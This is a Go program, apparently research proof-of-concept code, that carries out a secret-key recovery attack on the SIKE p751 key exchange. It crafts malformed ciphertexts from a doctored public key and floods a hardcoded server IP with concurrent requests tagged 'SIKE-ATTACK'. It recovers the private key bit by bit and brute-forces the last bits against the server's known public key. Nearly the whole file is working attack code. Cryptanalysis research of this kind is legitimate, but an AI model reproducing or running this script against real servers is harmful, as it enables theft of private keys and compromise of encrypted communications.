package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"io/ioutil"
	"log"
	"net/http"
	"sync"

	"fmt"
	"math"
	"os"
	"strconv"
	"time"

	"github.com/cloudflare/circl/dh/sidh"
	"github.com/cloudflare/circl/dh/sidh/internal/common"
	"github.com/cloudflare/circl/dh/sidh/internal/p751"
)

var wg_sike sync.WaitGroup

type sikeVec struct {
	id      uint8
	name    string
	kem     *sidh.KEM
	KatFile string
	PkB     string
	PrB     string
}

func sendSIKE(ct []byte) {
	defer wg_sike.Done()
	//FIXME
	url := "http://130.126.136.241:9000"

	http.DefaultTransport.(*http.Transport).MaxIdleConnsPerHost = 1000

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(ct))
	if err != nil {
		log.Println("Error during NewRequest!", err)
	}

	req.Header.Set("X-Custom-Header", "SIKE-ATTACK")
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}

	resp, err1 := client.Do(req)
	if err1 != nil {
		log.Println("Error during client Do!", err1)
	}

	_, err2 := ioutil.ReadAll(resp.Body)
	if err2 != nil {
		log.Println("Error during ReadAll!!", err2)
	}

	if err != nil || err1 != nil || err2 != nil {
		panic(err)
	}

	resp.Body.Close()

}

func main() {
	public_key_server_pt0 := common.Fp2{
		A: common.Fp{
			0x8dd500119b03530e, 0x1e5ca2e72b0d1bac, 0x3151c65b1853b7ab, 0xa9fa8325e933c9a5, 0xa78b7f6d89e82f40, 0x312a120142a843f2, 0x97b541092f59254c, 0x3c3ee0628eb21d1a, 0x51ff9cb33e1f6410, 0x533215c9b61f17bb, 0x8b1c69f16cf2c492, 0xdc5c1e83adfc,
		},
		B: common.Fp{
			0x3e6cdfbb1355ec4a, 0xb1ba6c9c617c4da1, 0x5d47ae253787d5fe, 0xc4fd3a2141eda84b, 0x82baeb669690de56, 0x949704d5a0cc20, 0x1e8bfd55c22a42c5, 0x82c853210fc67dcc, 0x30900ee1b368b102, 0xae2eef46cbc8b804, 0x610a8afec37b9a1b, 0x360bbe6c3e73,
		},
	}
	public_key_server_pt1 := common.Fp2{
		A: common.Fp{
			0xc5383a9ab0c69d63, 0x539a07859624995c, 0x955c5e8fb27d857c, 0x811b6ab21f081142, 0x3ef36cd86ca002b3, 0x29a11e671edc65c5, 0x44b59a52f6e21a51, 0x1cd83c162f24cc8, 0x2b6ccae13eff2e16, 0xe857d0dd6c2fd154, 0x7262913f9e7f39c2, 0x5126f83fb1f0,
		},
		B: common.Fp{
			0xd91e1f3cde675f72, 0x8cfcdb4b85959d, 0x44c0841ce3f9880e, 0xb0b9817a5aad6be8, 0x4014d54b475a515f, 0xed681c5a3703a7ea, 0xbdcc98b9c8180812, 0x5cfbc804259390b5, 0x5b9895fb464b9e94, 0xd814b167efa9cdfd, 0x648dc525aa9e9721, 0x258538056a0,
		},
	}
	public_key_server_pt2 := common.Fp2{
		A: common.Fp{
			0xc25d4f5be8e355b2, 0x8c2f2752d4981fb5, 0x6064f14ebe081d, 0xea7f13688376c44e, 0xc9176bd3d6a50db7, 0x47fa25a57308cb78, 0x8ccf6a051b67bf1b, 0xbe89c6859d444442, 0x402bcde27d68b11d, 0x426ae37b5ef745bd, 0xe5f1d996322fcc3c, 0x5c87dc2321b8,
		},
		B: common.Fp{
			0xb02aef8b5b5e8f3e, 0x3b4f43230aaf5bb5, 0x6c16c5d404beaf80, 0xe89f5d573b5bd500, 0x61ed35eaed49fb68, 0xb6c72c79759cacd, 0xcba15d94d13da9c4, 0x734b6829912be9ea, 0x77a7ee7cc5f6b20c, 0x78893e31e33b46ed, 0xfda444a855e8c816, 0x53a6784defe6,
		},
	}

	var length_sk uint
	length_sk = uint(378)
	// request_count: how many requests we make in one bunch
	// iterations: how many iterations we compute for one target bit
	// filename: the file of the recovered secret key so far
	// index_to_recover: the next index to recover
	request_count, _ := strconv.ParseUint(os.Args[1], 10, 32)
	iterations, _ := strconv.ParseUint(os.Args[2], 10, 32)
	filename := os.Args[3]
	index_to_recover, _ := strconv.ParseUint(os.Args[4], 10, 32)

	request_count_int := int(request_count)
	iterations_int := int(iterations)
	index_to_recover_int := uint(index_to_recover)

	fmt.Println("request_count_int, \n", request_count_int)
	fmt.Println("iterations_int, \n", iterations_int)
	fmt.Println("index_to_recover_int, \n", index_to_recover_int)

	file, err := os.Open(filename)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	sk_recovered := make([]uint8, index_to_recover_int+1)
	count := 0
	if index_to_recover_int != 0 {
		for scanner.Scan() {
			curr, _ := strconv.ParseUint(scanner.Text(), 10, 32)
			sk_recovered[count] = uint8(curr)
			count = count + 1
			if uint(count) == index_to_recover_int {
				break
			}
		}
	}

	var v sikeVec
	v.id = 1
	v.kem = sidh.NewSike751(rand.Reader)
	sk := sidh.NewPrivateKey(v.id, sidh.KeyVariantSike)
	pk := sidh.NewPublicKey(v.id, sidh.KeyVariantSike)
	sk.Generate(rand.Reader)
	sk.GeneratePublicKey(pk)

	var ssE [common.MaxSharedSecretBsz]byte
	var ct = make([]byte, v.kem.CiphertextSize())

	one := common.Fp2{
		A: common.Fp{
			0x00000000000249ad, 0x0000000000000000, 0x0000000000000000,
			0x0000000000000000, 0x0000000000000000, 0x8310000000000000,
			0x5527b1e4375c6c66, 0x697797bf3f4f24d0, 0xc89db7b2ac5c4e2e,
			0x4ca4b439d2076956, 0x10f7926c7512c7e9, 0x00002d5b24bce5e2},
	}

	// 6*R mod p
	six := common.Fp2{
		A: common.Fp{
			0x00000000000DBA10, 0x0000000000000000, 0x0000000000000000,
			0x0000000000000000, 0x0000000000000000, 0x3500000000000000,
			0x3714FE4EB8399915, 0xC3A2584753EB43F4, 0xA3151D605C520428,
			0xC116CF5232C7C978, 0x49A84D4B8EFAF6AA, 0x0000305731E97514},
	}
	cparam := common.ProjectiveCurveParameters{
		A: six,
		C: one,
	}

	var xR0, xR1, xR2 common.Fp2
	xR0, xR1, xR2 = p751.Prep_ct(&cparam, length_sk, sk_recovered, index_to_recover_int, 0)

	var pk_fake = sidh.NewPublicKey(v.id, sidh.KeyVariantSike)
	pk_fake.Modify_PublicKey(xR0, xR1, xR2)
	var ct_fake = make([]byte, v.kem.CiphertextSize())
	pk_fake.Export(ct_fake)

	v.kem.Reset()
	_ = v.kem.Encapsulate(ct, ssE[:], pk)

	copy(ct[:pk_fake.Size()], ct_fake[:pk_fake.Size()])

	// Ask the server to reveal the secret
	if request_count_int == 0 {
		SECRET := []byte{'S', 'E', 'C', 'R', 'E', 'T'}
		wg_sike.Add(1)
		sendSIKE(SECRET)
		return
	}

	for i := uint(0); i < uint(iterations_int); i++ {

		all_start := time.Now()

		wg_sike.Add(request_count_int)
		for j := uint(0); j < uint(request_count_int); j++ {
			go sendSIKE(ct)
		}
		wg_sike.Wait()

		all_duration := time.Since(all_start)

		fmt.Println("ALL_DURATION", all_duration)

	}

	// We do not have much secret bits left, so lets start brute forcing the rest of the secret key by comparing with the public key
	if iterations_int == 0 {
		sk_full := make([]uint8, length_sk)
		for i := uint(0); i < index_to_recover_int; i++ {
			sk_full[i] = sk_recovered[i]
		}

		total := int(math.Pow(2, float64(uint(length_sk)-index_to_recover_int)))
		for i := uint(0); i < uint(total); i++ {
			for j := index_to_recover_int; j < length_sk; j++ {
				sk_full[j] = 0
			}

			fmt.Println("i, \n", i)
			curr_bb := strconv.FormatInt(int64(i), 2) //brute force bits
			fmt.Println("curr_bb, \n", curr_bb)
			for j := 0; j < len(curr_bb); j++ {
				sk_full[length_sk-uint(len(curr_bb))+uint(j)] = uint8(int(curr_bb[j]) - '0')
			}
			fmt.Println("sk_full, \n", sk_full)

			sk_curr := make([]uint8, 48)
			count_byte := 0
			curr_byte := uint8(0)
			for j := uint(0); j < length_sk; j++ {
				if j%8 == 0 {
					curr_byte = uint8(0)
				}
				index := j % 8
				value := sk_full[j] * uint8(math.Pow(2, float64(index)))
				curr_byte = curr_byte + value
				if (j%8 == 7) || (j == (length_sk - 1)) {
					sk_curr[count_byte] = curr_byte
					count_byte = count_byte + 1
				}
			}
			fmt.Println("sk_curr, \n", sk_curr)

			sk := sidh.NewPrivateKey(1, sidh.KeyVariantSike)
			pk := sidh.NewPublicKey(1, sidh.KeyVariantSike)
			sk.Scalar = sk_curr
			sk.GeneratePublicKey(pk)
			fmt.Println("sk Scalar%v", sk.Scalar)

			if pk.Compare_PublicKey(public_key_server_pt0, public_key_server_pt1, public_key_server_pt2) == 1 {
				fmt.Println("Recovered sk Scalar!!!!%v", sk.Scalar)
				for j := uint(0); j < 378; j++ {
					bit := (sk.Scalar[j>>3] >> (j & 7) & 1)
					fmt.Printf("%v\n", bit)
				}
				SHUT := []byte{'S', 'H', 'U', 'T'}
				sendSIKE(SHUT)
				os.Exit(3)
			}
		}

		SHUT := []byte{'S', 'H', 'U', 'T'}
		sendSIKE(SHUT)

	}
	return
}
